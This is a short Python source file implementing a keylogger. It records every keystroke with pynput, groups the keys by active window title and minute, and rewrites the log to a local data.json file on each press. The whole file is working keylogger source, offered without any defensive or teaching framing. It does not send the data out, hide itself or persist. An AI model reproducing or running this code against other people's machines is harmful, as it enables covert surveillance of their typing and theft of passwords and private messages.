from datetime import datetime
from pynput.keyboard import Listener
import pygetwindow as gw
import json

class KeyLoggerService:
    def __init__(self):
        self.dict = {}

    def on_press(self, key):
        if self._get_window() not in self.dict:
            self.dict[self._get_window()] = {self._get_time(): self._add_char(key)}
        else:
            if self._get_time() not in self.dict[self._get_window()]:
                self.dict[self._get_window()][self._get_time()] = self._add_char(key)
            else:
                self.dict[self._get_window()][self._get_time()] += self._add_char(key)

        FileWriter.write_to_file(self.dict)
        # print(self.dict)

    def _add_char(self, key):
        if hasattr(key, 'char'):
            return key.char
        elif str(key) == "Key.space":
            return " "
        else:
            return f" [{key}] "

    def _get_window(self):
        return gw.getActiveWindow().title

    def _get_time(self):
        return datetime.now().strftime("%d/%m/%y %H:%M")

class FileWriter:
    def __init__(self, file_path='./data.json'):
        self.file_path = file_path

    def write_to_file(self, data_json):
        with open(self.file_path, 'w') as my_data_json:
            json.dump(data_json, my_data_json, indent=4)


FileWriter = FileWriter()
KeyLoggerService = KeyLoggerService()
with Listener(on_press=KeyLoggerService.on_press) as listener:
    listener.join()


# know im at the main